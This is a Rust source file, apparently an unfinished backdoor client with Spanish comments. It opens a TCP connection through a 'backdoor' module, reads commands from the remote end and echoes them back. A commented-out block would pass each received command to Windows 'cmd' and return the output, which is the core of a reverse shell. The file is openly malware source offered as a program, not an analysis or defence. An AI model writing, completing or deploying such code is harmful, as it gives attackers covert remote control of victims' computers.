use std::io::prelude::*;
use std::net::TcpStream;
use std::str::from_utf8;
use std::process::{Command, Output};
mod backdoor;


fn main() -> std::io::Result<()> {
    
    let mut stream: TcpStream = backdoor::start_connection::establish_connection(10);
    loop {
        let mut data = [0; 1024];//hay que tener esto para manejar una gran cantidad de datos , con 6 bytes no basta ya que solo te da una salida de 6 caracteres
        match stream.read(&mut data) {
            Ok(_) => {
                let command = from_utf8(&data).unwrap();
                println!("{}",command);
                
                stream.write(command.as_bytes()).unwrap();
                stream.flush().unwrap();
                //match stream.write(command.as_bytes()){
                //    Ok(_)=>{},
                //    Err(_)=>{return Ok(());}// con esto ya termina la conexion en el caso de que se haya cerrado la conexion
                //};
            /*let output = Command::new("cmd")
                                    .arg("command")
                                    .output()
                                    .expect("failed to execute process");

                            println!("status: {}", output.status);
                            println!("stdout: {}", String::from_utf8_lossy(&output.stdout));
                            println!("stderr: {}", String::from_utf8_lossy(&output.stderr));*/
                
                ()
            }
            Err(_) => (),
        }
    }
}
